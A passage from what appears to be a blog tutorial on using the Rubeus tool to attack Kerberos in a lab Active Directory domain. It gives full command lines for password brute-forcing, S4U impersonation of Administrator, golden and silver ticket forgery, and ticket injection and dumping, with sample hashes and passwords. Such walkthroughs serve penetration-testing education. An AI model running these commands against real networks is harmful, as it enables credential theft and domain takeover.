alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZIVjHBOo3oUV7kNLe-E4sPeFKTAwW2e0nUV2BxXFxZ2R_Bni2LUjvkiKIL6o0Ugfs_S5N2Q8f383lwlGR0ZYYEcY0VNeha3W0UHtCM8-LaYDxBDWL8GUww5gK3Bb29OUr5U5FB2trJ4h7A3hJEP6BGlNBjcmbBBnaQ2pGfA1Yq7d0REz4DLydwjMjcw/s16000/10.png?w=640&amp;ssl=1\"></p>\n<h3 id=\"Klist\"><a href=\"#Klist\" class=\"headerlink\" title=\"Klist\"></a>Klist</h3><p>Klist command in Windows can be used to view the tickets generated in the system. Here, when we run klist command we can see that a KRBTGT and an LDAP TGS have been generated and stored in the session.</p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXmMQ3Twpy5cfkNrwiuysEB9XtIXh5Onuq41Bmss3tO8zzDskS2mgte_KiIvRlPd_RyXr0MAFRP1tuBCkp4nZsAnXwW_gvyP0Fc0LsftC28dDE-V4DQIGExLvnrGD37LUhlyzROJIrdVf4hBDa0HNFhlZzjLIzQfedFGmAA3UzYsbDNPP-7dSmT2mL3w/s16000/11.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXmMQ3Twpy5cfkNrwiuysEB9XtIXh5Onuq41Bmss3tO8zzDskS2mgte_KiIvRlPd_RyXr0MAFRP1tuBCkp4nZsAnXwW_gvyP0Fc0LsftC28dDE-V4DQIGExLvnrGD37LUhlyzROJIrdVf4hBDa0HNFhlZzjLIzQfedFGmAA3UzYsbDNPP-7dSmT2mL3w/s16000/11.png?w=640&amp;ssl=1\"></p>\n<h3 id=\"Renew\"><a href=\"#Renew\" class=\"headerlink\" title=\"Renew\"></a>Renew</h3><p>The renew function in Rubeus builds a TGT renewal exchange. We can specify a domain controller using the &#x2F;dc flag which will be used as a destination for the renewal traffic. We can further use the <strong>tgtdeleg</strong> option with this and extract user’s credentials without elevation and keep it alive on another system for a week by default.</p>\n<p><strong>&#x2F;ptt</strong> flag can also be used in conjunction to apply the Kerberos</p>\n<p><code>rubeus.exe renew /dc:dc1.ignite.local /ticket:doIFNDCCB....bA==</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0GpSeTg61s0HWOXUHdRK5JkiFgSUmbHE6Hu8QPFINoVu4eEqrhwjcHgkE1N0vy8W_JenfEymZ7Wuzom7DSJ6SB_4A-t6xhhM3YXnM8gN0gu8AVq1yI0boCr_kPi_igdmkLF6SXz_42IPOR0qLwkAk6TffeJVnoZkAvNtc6zcQaccR5YRLVheZyn2dfQ/s16000/12.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0GpSeTg61s0HWOXUHdRK5JkiFgSUmbHE6Hu8QPFINoVu4eEqrhwjcHgkE1N0vy8W_JenfEymZ7Wuzom7DSJ6SB_4A-t6xhhM3YXnM8gN0gu8AVq1yI0boCr_kPi_igdmkLF6SXz_42IPOR0qLwkAk6TffeJVnoZkAvNtc6zcQaccR5YRLVheZyn2dfQ/s16000/12.png?w=640&amp;ssl=1\"></p>\n<p><strong>&#x2F;autorenew</strong> sub-function will put the exchange to sleep for endTime 30 minutes and after that window automatically renew the TGT and display the renewed ticket</p>\n<p><code>rubeus.exe renew /dc:dc1.ignite.local /autorenew /ticket:doIFNDCCBTCgAw...bA==</code></p>\n<p> <img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirxuh_4JAood6FK5wMIFjbbs0mBlJXHHg46gL0FKhJWDkjDN3w9wfsBIexmRzJAtlxXozcTEeCVpU6C46ls0Pfp71GSt6jQTo9ma5H7Vph83B8TsK9lpiHim6VtnmtHOxxdXiLt1dEorn2IWthB-ugOAgUBNXAmseTdzwrlN7MjsNfuW6mQAsP8Y3FJw/s16000/14.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirxuh_4JAood6FK5wMIFjbbs0mBlJXHHg46gL0FKhJWDkjDN3w9wfsBIexmRzJAtlxXozcTEeCVpU6C46ls0Pfp71GSt6jQTo9ma5H7Vph83B8TsK9lpiHim6VtnmtHOxxdXiLt1dEorn2IWthB-ugOAgUBNXAmseTdzwrlN7MjsNfuW6mQAsP8Y3FJw/s16000/14.png?w=640&amp;ssl=1\"></p>\n<p>As you may now observe that after a specified time interval a renewed TGT is shown</p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9bgCsSYADAltUs7Q3vRTfTZDSOf9wRunhlIc3WNMZQChVO_iVgdHe8bCNACLVVLt4o4Ewk9U78KMJ3wiuwYiQGmsuWgp0W6T3wLYBVOKmBS7VZjRBPxEZJs_Tx-slKrZI9fPJxIKrhQXu7tbQR3966yrXxlLgVFsOFzb-zOtRAhv2U4Wb1xoa9HuNxQ/s16000/15.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9bgCsSYADAltUs7Q3vRTfTZDSOf9wRunhlIc3WNMZQChVO_iVgdHe8bCNACLVVLt4o4Ewk9U78KMJ3wiuwYiQGmsuWgp0W6T3wLYBVOKmBS7VZjRBPxEZJs_Tx-slKrZI9fPJxIKrhQXu7tbQR3966yrXxlLgVFsOFzb-zOtRAhv2U4Wb1xoa9HuNxQ/s16000/15.png?w=640&amp;ssl=1\"></p>\n<p><strong>Brute</strong></p>\n<p>The brute option in Rubeus can be used to perform a password bruteforce attack against all the existing user accounts in Active Directory. Many times, the same password is used with multiple accounts in real-life enterprise infrastructure. So, brute option can generate multiple TGTs in those accounts having the same password. &#x2F;noticket can be used in conjunction with this option since no ticket is provided with this functionality. For example,</p>\n<p><code>rubeus.exe brute /password:Password@1 /noticket</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8INMtJE1du0EspNXMj77ZWTFOnXpqubTigbJ7OEAxdyYRsYdzmFOJ6-4TC9981a5sSh1gSumtK8toDQRacSx-xpU2atrsKCEmiXTlzVuc-WEDEfA_JGRDYtF14fyCnh9rpUCKBdyVKWzgX7BauXZv9MNt-_w1XmV8xOiuN4ZaLpQmy_5xzuuxZDvivA/s16000/16.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8INMtJE1du0EspNXMj77ZWTFOnXpqubTigbJ7OEAxdyYRsYdzmFOJ6-4TC9981a5sSh1gSumtK8toDQRacSx-xpU2atrsKCEmiXTlzVuc-WEDEfA_JGRDYtF14fyCnh9rpUCKBdyVKWzgX7BauXZv9MNt-_w1XmV8xOiuN4ZaLpQmy_5xzuuxZDvivA/s16000/16.png?w=640&amp;ssl=1\"></p>\n<p><strong>Hash</strong></p>\n<p>Rubeus is capable of taking in passwords and generating hashes of them. These are of different formats including NTLM (rc4_hmac) hash. To do this, we can use a <strong>hash</strong> function and provide a domain using &#x2F;domain, an account’s name (can be a machine account too) using the&#x2F;user flag and the password using &#x2F;password.</p>\n<p><code>rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZwNam6iqN9HFpOVruPYUbfV6Fv4Jdy5rhK3M5jh0bC0T8fCyiuaBZGICX4VpQMH8VgHtHC-W_xc75J_k3fc9VlCPhPjJAwrAYd2EjRxisDx0J7AA0RVzq8v1QSHG9EBQ_vKxFfwqIN8UxppwBCl4X6AlqH31yo_kUhXtwIoC6FMMXQjdIxkj4RM_RXA/s16000/17.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZwNam6iqN9HFpOVruPYUbfV6Fv4Jdy5rhK3M5jh0bC0T8fCyiuaBZGICX4VpQMH8VgHtHC-W_xc75J_k3fc9VlCPhPjJAwrAYd2EjRxisDx0J7AA0RVzq8v1QSHG9EBQ_vKxFfwqIN8UxppwBCl4X6AlqH31yo_kUhXtwIoC6FMMXQjdIxkj4RM_RXA/s16000/17.png?w=640&amp;ssl=1\"></p>\n<p>As you can see 4 different hashes have been output. Various encryption ciphers are used in conjunction with popular hashing techniques. All of these ciphers are supported in AD environment and hence, may be used for different purposes.</p>\n<p><strong>S4u</strong></p>\n<p>We saw above how we can generate hashes using Rubeus. Now let’s talk about one such attack where hashes can be used to impersonate another user and carry out delegation attacks. For a detailed write-up on delegation, and attacks follow the link <strong><a href=\"https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/\">here</a></strong>. In short, OS post-Windows server 2003 contained a Kerberos protocol extension called s4uself and s4uproxy. These protocols can be used to conduct delegation attacks. For example, in the example below, we have performed an attack called “Resource-Based Constrained Delegation” which benefits the <strong>msDS-AllowedToActOnBehalfOfAnotherIdentity</strong> option set in the attribute’s editor. Follow the article <strong><a href=\"https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/\">here</a></strong> for a full attack. In the example below, we’ll use the user noob’s hash and then impersonate Administrator account.</p>\n<ul>\n<li><p>&#x2F;rc4: flag is used to provide user noob’s account.</p>\n</li>\n<li><p>&#x2F;impersonateuser: User that will be impersonated by noob.</p>\n</li>\n<li><p>&#x2F;msdsspn: A valid msDS-AllowedToActOnBehalfOfAnotherIdentity value for the account. Here, the domain controller</p>\n</li>\n<li><p>&#x2F;altservice: can be supplied to substitute one or more service names in the resulting .kirbi file.</p>\n</li>\n<li><p>&#x2F;ptt: Injects the resulting ticket in the current terminal session</p>\n</li>\n</ul>\n<p><code>rubeus.exe s4u /user:noob$ /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /impersonateuser:Administrator /msdsspn:host/dc1.ignite.local /altservice:cifs /domain:ignite.local /ptt</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKaBMUp5U77qh_6bLSEV5bfowSgiBZUnNH2RVGlwxy6mUTG9N64BCvW5gcbsu6DIUNQ2Y3AmFBysTZZBbaXsZSivH7JAfNBMHVF9NjFyNc3_6qdjTyVa2Oh5Y3lkzvTMlMV0NptR-PLeyvgEPczWZdi1gf_AhJm9H_3vq1zXG_68zKek31PTNhtK5QDw/s16000/18.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKaBMUp5U77qh_6bLSEV5bfowSgiBZUnNH2RVGlwxy6mUTG9N64BCvW5gcbsu6DIUNQ2Y3AmFBysTZZBbaXsZSivH7JAfNBMHVF9NjFyNc3_6qdjTyVa2Oh5Y3lkzvTMlMV0NptR-PLeyvgEPczWZdi1gf_AhJm9H_3vq1zXG_68zKek31PTNhtK5QDw/s16000/18.png?w=640&amp;ssl=1\"></p>\n<p>This would generate a ticket for Administrator user over the specified SPN. In short, we can now act as DC.</p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUB3Gg2Pl5L3PtqMzd7Q7xa8K50p7yK8r3YqVEj5VgHAcAClYIFIwE4kiN-UcO58nHkB5BjLOOtlEAAIcd86f0oq3_I6K2XCmjkFVZnjDUggjoiycvgi9tOn-iuZ1FeiJY4BoxpP2dfMdC7xFQH7vpG-ahmBvjzVP1_QE6Hlv-LjJqBDnqkIi03zzb6A/s16000/19.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUB3Gg2Pl5L3PtqMzd7Q7xa8K50p7yK8r3YqVEj5VgHAcAClYIFIwE4kiN-UcO58nHkB5BjLOOtlEAAIcd86f0oq3_I6K2XCmjkFVZnjDUggjoiycvgi9tOn-iuZ1FeiJY4BoxpP2dfMdC7xFQH7vpG-ahmBvjzVP1_QE6Hlv-LjJqBDnqkIi03zzb6A/s16000/19.png?w=640&amp;ssl=1\"></p>\n<h3 id=\"Golden-Ticket\"><a href=\"#Golden-Ticket\" class=\"headerlink\" title=\"Golden Ticket\"></a>Golden Ticket</h3><p>Golden tickets are forged KRBTGTs (Key Distribution Service account) which can be used to forge other TGTs. This provides an attacker persistence over the domain accounts. For a detailed walkthrough on the topic you can visit the article <strong><a href=\"https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/\">here</a></strong>.</p>\n<p>To forge a golden ticket for user harshitrajpal, we first generate an AES hash (RC4 works too) using the hash command in Rubeus and then using the golden function like so. Here,</p>\n<ul>\n<li><p>&#x2F;ldap: Retrieves information of user over LDAP protocol</p>\n</li>\n<li><p>&#x2F;user: Username whose ticket will be forged</p>\n</li>\n<li><p>&#x2F;printcmd: displays a one liner command that can be used to generate the ticket again that just got generated</p>\n</li>\n</ul>\n<p><code>rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1</code></p>\n<p><code>rubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:harshitrajpal /printcmd</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPW0OyVNb9deU4qubrM9AEjoOx7201V4pamhV-2Mru0bgQtPYpuvLlJkuOKv4V4mm0Oev2mb8XOF3JccaoZz3xtI5l8psPzgyrBbsYNB8lN3BjcNIVbbiit7B6-ly-ba4JeQ_aKuWgmQp_Vlwgiopb3z763jc82mW25GyqIOdhlWEV8YtqKGQsI6GQVA/s16000/20.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPW0OyVNb9deU4qubrM9AEjoOx7201V4pamhV-2Mru0bgQtPYpuvLlJkuOKv4V4mm0Oev2mb8XOF3JccaoZz3xtI5l8psPzgyrBbsYNB8lN3BjcNIVbbiit7B6-ly-ba4JeQ_aKuWgmQp_Vlwgiopb3z763jc82mW25GyqIOdhlWEV8YtqKGQsI6GQVA/s16000/20.png?w=640&amp;ssl=1\"></p>\n<p>As you can see various details like SID, userID, Service Key etc are being fetched over LDAP which are important to generate a ticket. PAC signing is also done and a TGT generated for harshitrajpal</p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxY76i8rRENeczKVXlyQt-PAGh-qYsRVlpB7wJe-Up8Xnkv6aBrdlB7CQVFsBFznkq015OPZG3Y77ndDEAnQ2UsV4zmdzEONj1lJaf2NcJvg7TaOgE31UHNMER3COPjpOHUuu3XfwgQmdB4WcYn_sXi4bHMITqEbMghPGGrvs4pHHshPb-WnJKFr15VA/s16000/21.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxY76i8rRENeczKVXlyQt-PAGh-qYsRVlpB7wJe-Up8Xnkv6aBrdlB7CQVFsBFznkq015OPZG3Y77ndDEAnQ2UsV4zmdzEONj1lJaf2NcJvg7TaOgE31UHNMER3COPjpOHUuu3XfwgQmdB4WcYn_sXi4bHMITqEbMghPGGrvs4pHHshPb-WnJKFr15VA/s16000/21.png?w=640&amp;ssl=1\"></p>\n<p>Also, at the end you’ll see a one liner command that can be used to generate this TGT again.</p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfywgxE1QC5yHtbQrFXEPtYWOTQCW2-OvfyCFEcnV3kZX4O_HwPo1OK0pF-fN_TqCpzYuChAht98oyoZWFgawOvvrN6phmhaqcd_rhEscMJs6x2FLcjdFTwf6i2mUoaVwXwP9z_liDl9Y7O3eB7_YoRVJm5o42LcnjkS5-JFhYoyRv_219ADE8Zd-mnQ/s16000/22.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfywgxE1QC5yHtbQrFXEPtYWOTQCW2-OvfyCFEcnV3kZX4O_HwPo1OK0pF-fN_TqCpzYuChAht98oyoZWFgawOvvrN6phmhaqcd_rhEscMJs6x2FLcjdFTwf6i2mUoaVwXwP9z_liDl9Y7O3eB7_YoRVJm5o42LcnjkS5-JFhYoyRv_219ADE8Zd-mnQ/s16000/22.png?w=640&amp;ssl=1\"></p>\n<p>Various other options can be used in conjunction with golden to modify the generated TGT like:</p>\n<ul>\n<li><p>&#x2F;rangeinterval: After every time specified, a new ticket will be generated.</p>\n</li>\n<li><p>&#x2F;rangeend: Specifies the maximum time tickets will be generated for. Here, 5 days. Since rangeinterval is 1d, 5 different tickets will be generated.</p>\n</li>\n</ul>\n<p>For a full list of modifications, see <a href=\"https://github.com/GhostPack/Rubeus#ticket-forgery\">this</a> page.</p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUypE_lTmt2yK73cZqzgsmQQNTlCV36mrTI6qA649BmStnd2VqKiA8VYyUPv6hJTM-qGOBzoeTDZ11TDCeAZrjJVNsaSkBSDHDiFU_RQEEywN-i8bA9II87KdJjC1zdo7ekO1CxpuuNA9sSlz5L-5QfhKXLmPzYasAgLoCiD9ygPjc8lF3n4wn9oZWzQ/s16000/23.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUypE_lTmt2yK73cZqzgsmQQNTlCV36mrTI6qA649BmStnd2VqKiA8VYyUPv6hJTM-qGOBzoeTDZ11TDCeAZrjJVNsaSkBSDHDiFU_RQEEywN-i8bA9II87KdJjC1zdo7ekO1CxpuuNA9sSlz5L-5QfhKXLmPzYasAgLoCiD9ygPjc8lF3n4wn9oZWzQ/s16000/23.png?w=640&amp;ssl=1\"></p>\n<h3 id=\"Silver-Ticket\"><a href=\"#Silver-Ticket\" class=\"headerlink\" title=\"Silver Ticket\"></a>Silver Ticket</h3><p>Silver tickets are forged Kerberos Ticket Granting Service (TGS) Tickets but with silver tickets there is no communication with the domain controller. It is signed by the service account configured with an SPN for each server the Kerberos-authenticating service runs on. For more details visit the page <strong><a href=\"https://adsecurity.org/?p=2011\">here</a></strong>.</p>\n<p>Silver ticket attack can be performed using Rubeus using silver function. Other customisations need be made like:</p>\n<ul>\n<li><p>&#x2F;service: SPN of the service ticket is being generated for</p>\n</li>\n<li><p>&#x2F;rc4: Hash of a valid user (harshitrajpal here) which will be used to encrypt the generated ticket</p>\n</li>\n<li><p>&#x2F;user: username of the user whose hash is provided</p>\n</li>\n<li><p>&#x2F;creduser: User to be impersonated</p>\n</li>\n<li><p>&#x2F;credpassword: Password of the user to be impersonated</p>\n</li>\n<li><p>&#x2F;krbkey: used to create the KDCChecksum and TicketChecksum. This is the AES256 hmac sha1 hash in the following case.</p>\n</li>\n<li><p>&#x2F;krbenctype: type of encrypted hash used. Aes256 here.</p>\n</li>\n</ul>\n<p><code>rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1</code></p>\n<p><code>rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ignite.local\\Administrator /credpassword:Ignite@987 /user:harshitrajpal /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ignite.local /ptt</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisS0kDD040twsfat2VTDk5Vb0CHVG5Ho8l7jvHce-9bDMM8q0bKmcZS-Mft-uYxbjVHPPvftsC-fmkKmWH7JKLW7gp9OhKSsh64nwt597z00_UyhrzIsbxvWYysVr2DFj__o88gbUKXoiH8ghDmX1nttn9j0URoOF8avXUSyibjLTmYWLBDAPgqIPFHA/s16000/24.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisS0kDD040twsfat2VTDk5Vb0CHVG5Ho8l7jvHce-9bDMM8q0bKmcZS-Mft-uYxbjVHPPvftsC-fmkKmWH7JKLW7gp9OhKSsh64nwt597z00_UyhrzIsbxvWYysVr2DFj__o88gbUKXoiH8ghDmX1nttn9j0URoOF8avXUSyibjLTmYWLBDAPgqIPFHA/s16000/24.png?w=640&amp;ssl=1\"></p>\n<p>This helped us generate a silver ticker for Administrator account. And as a result, we are now able to access DC machine’s C drive</p>\n<p><code>dir \\\\dc1.ignite.local\\c$</code><br><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXSuXCGmt8xKSiStl62a7d-U4QriyKnr09ulubQzP_4Xb3qvrtuswXkVm6d2JnRe2wW-fJCXEFZmwy-DYtS5tivoUszspE8U0tMbNs2MbnVW1rTihlWrJdQp_RlmtBhL2eIx_TwHPSn3wgsq1UfhhoPB9zY3zRsV77ZmCYZB-C8p510xPjbnutXcFNDA/s16000/25.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXSuXCGmt8xKSiStl62a7d-U4QriyKnr09ulubQzP_4Xb3qvrtuswXkVm6d2JnRe2wW-fJCXEFZmwy-DYtS5tivoUszspE8U0tMbNs2MbnVW1rTihlWrJdQp_RlmtBhL2eIx_TwHPSn3wgsq1UfhhoPB9zY3zRsV77ZmCYZB-C8p510xPjbnutXcFNDA/s16000/25.png?w=640&amp;ssl=1\"></p>\n<h3 id=\"Ticket-Management\"><a href=\"#Ticket-Management\" class=\"headerlink\" title=\"Ticket Management\"></a>Ticket Management</h3><p>Rubeus contains multiple ticket management options that may aid a pentester to conduct operations effectively and stealthily. As a pentester, we need to manage our generated tickets.</p>\n<p><strong>Ptt</strong></p>\n<p>The Rubeus ptt option can import the supplied ticket in command line. The &#x2F;ptt can also be used in conjunction with other options that output tickets. For example,</p>\n<p><code>rubeus.exe ptt /ticket:doIFNDCCBTCgAwI...bA==</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKTVmohjirCZfdaG4GGv7-wzWMuQ58Q1_TCFHqBRpx9oRXWvvKAnWSir3Eh6VFwNFbwjPW2owjtkj25OSt2QZtX91OHITOdFbYToEfxgKkchxA1hhppI0_GbkGZKvhobYRcJMR_n8eN_SX67_x-GS_u_mqEhba24FoFO6tjr1I3p2p6xsd1uaI8H2kEA/s16000/26.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKTVmohjirCZfdaG4GGv7-wzWMuQ58Q1_TCFHqBRpx9oRXWvvKAnWSir3Eh6VFwNFbwjPW2owjtkj25OSt2QZtX91OHITOdFbYToEfxgKkchxA1hhppI0_GbkGZKvhobYRcJMR_n8eN_SX67_x-GS_u_mqEhba24FoFO6tjr1I3p2p6xsd1uaI8H2kEA/s16000/26.png?w=640&amp;ssl=1\"></p>\n<p>As you can see, the generated ticket has now been imported.</p>\n<p><strong>Purge</strong></p>\n<p>Rubeus has a purge option which can purge&#x2F;delete all the tickets existing in the current session.</p>\n<p>Here, we demonstrate how we purged 2 tickets listed by klist.</p>\n<p><code>rubeus.exe purge</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieNiT1NqlQJ6XX-v68CUP7L2r6GKfB7k4inUgNicpJfdwG25zZNJHQeekion5CN0asOuv8bdVDGlNLGfeoOqrmgfvdiK8Ws1Pya_9G56jX1XAN2M68-VRj8AmN6f30zGWpj-dSrTFKXcuysXB8X6wTrknGtv3gY8ug-tM2Dix9hE5ajlXBP58OudyvXg/s16000/27.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieNiT1NqlQJ6XX-v68CUP7L2r6GKfB7k4inUgNicpJfdwG25zZNJHQeekion5CN0asOuv8bdVDGlNLGfeoOqrmgfvdiK8Ws1Pya_9G56jX1XAN2M68-VRj8AmN6f30zGWpj-dSrTFKXcuysXB8X6wTrknGtv3gY8ug-tM2Dix9hE5ajlXBP58OudyvXg/s16000/27.png?w=640&amp;ssl=1\"></p>\n<p><strong>Describe</strong></p>\n<p>Often we lose track of the tickets in system. Describe option helps us to view details about a particular base64 encrypted blob or ticket.kirbi file.</p>\n<p>We can provide the ticket using &#x2F;ticket flag.</p>\n<p><code>rubeus.exe describe /ticket:doIFNDCCBTCg...bA==</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7WIoNU11b3w36Lw-C6yMzOBTFQxc7yc_-HXOlbJPfCnzdnN3paIj-5S8aSDB7zGWRHz-yeg3IiT1FTUhqgeN9xo6pJnO4fidzzgDOqGBbKNyv1j54uptRBvs2BFfWlJRmsqnM_Cy_kC7PuA9UysbRijcPorIUb3E4ZZrXLuVCfwCspDwVzBoUYAfF5A/s16000/28.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7WIoNU11b3w36Lw-C6yMzOBTFQxc7yc_-HXOlbJPfCnzdnN3paIj-5S8aSDB7zGWRHz-yeg3IiT1FTUhqgeN9xo6pJnO4fidzzgDOqGBbKNyv1j54uptRBvs2BFfWlJRmsqnM_Cy_kC7PuA9UysbRijcPorIUb3E4ZZrXLuVCfwCspDwVzBoUYAfF5A/s16000/28.png?w=640&amp;ssl=1\"></p>\n<p><strong>Triage</strong></p>\n<p>While klist views tickets for current session triage lists all the tickets. When a session is being run as an administrator, we can not only view tickets in the current user’s session memory but other user’s tickets in memory too.</p>\n<ul>\n<li>&#x2F;luid: This flag can be used to provide a specific user ID.</li>\n</ul>\n<p><code>rubeus.exe triage</code><br><code>rubeus.exe triage /luid:*0x8f57c*</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiY-eDU_fYg-Ta1R9oB54ePb_m9XufvCqw8HWY9J52F9-2dKB3zjQb7L50ZyXuk9GulLVXul-uPlDeDRfkGvUXiM0uJF8RRbb9ZGHrtGDW6TL6SqMvSpg9InazDv7SrjpG5DQsDeXGLNp6O4akhBrlu9qL714Z_mi-G6Db8knG2YgQICInIPR2oyb0T2w/s16000/29.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiY-eDU_fYg-Ta1R9oB54ePb_m9XufvCqw8HWY9J52F9-2dKB3zjQb7L50ZyXuk9GulLVXul-uPlDeDRfkGvUXiM0uJF8RRbb9ZGHrtGDW6TL6SqMvSpg9InazDv7SrjpG5DQsDeXGLNp6O4akhBrlu9qL714Z_mi-G6Db8knG2YgQICInIPR2oyb0T2w/s16000/29.png?w=640&amp;ssl=1\"></p>\n<p>Also, when the LUID is known, we can purge particular user’s tickets too (elevated mode only)</p>\n<p><code>rubeus.exe purge /luid:*0x8f57c*</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAKUAPB_XJDt6Tq5e8P6aR9obYD55fJBc83A0X11E6HQ-OPvfsuonWsT5MUVoB9GQYhCeaYRRP7tz1prxHmQ7v_DSUWpoCbBXozmfFwWxjNWQCJ8fEfw8cp6xhFXJWfqCAWcyixZ_Aajw4ArGdgMFj_tlqznpADDUFs4yY1RuQns1qfFU6IYmZO9WGTQ/s16000/30.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAKUAPB_XJDt6Tq5e8P6aR9obYD55fJBc83A0X11E6HQ-OPvfsuonWsT5MUVoB9GQYhCeaYRRP7tz1prxHmQ7v_DSUWpoCbBXozmfFwWxjNWQCJ8fEfw8cp6xhFXJWfqCAWcyixZ_Aajw4ArGdgMFj_tlqznpADDUFs4yY1RuQns1qfFU6IYmZO9WGTQ/s16000/30.png?w=640&amp;ssl=1\"></p>\n<p><strong>Dump</strong></p>\n<p>If the session is running in an elevated mode, a user can dump&#x2F; extract all the current TGTs and service tickets. Again, &#x2F;luid can be provided to dump specific user’s tickets. &#x2F;service can be used to filter these tickets.</p>\n<p>For example, &#x2F;service:krbtgt displays only TGTs.</p>\n<p><code>rubeus.exe dump</code></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0Wj1VAku1zDOX5hWi5X0sbmrJFZnXUu5eJQfHm8pXWCTHx0v62LUK30nibHWGq2RFDhFFCjXnSkccraTemLREKxKcd3gX42vNY7qdpwx7afNUL4907CfasdQo9jAFw5VbuXpPVovRHBzum8pdHBKJTj4spcRi2c66Or75V4gg9UwFXsWNzJYsU3BSsw/s16000/31.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0Wj1VAku1zDOX5hWi5X0sbmrJFZnXUu5eJQfHm8pXWCTHx0v62LUK30nibHWGq2RFDhFFCjXnSkccraTemLREKxKcd3gX42vNY7qdpwx7afNUL4907CfasdQo9jAFw5VbuXpPVovRHBzum8pdHBKJTj4spcRi2c66Or75V4gg9UwFXsWNzJYsU3BSsw/s16000/31.png?w=640&amp;ssl=1\"></p>\n<p>Next part I’ll work on the mitigation bit as it’s own unit hope you learnt a few bit on the read … 😊   </p>\n"},{"title":"Hacktheboo 2023 CTF","date":"2023-10-23T11:21:14.000Z","draft":false,"ShowReadingTime":true,"description":"Challenges 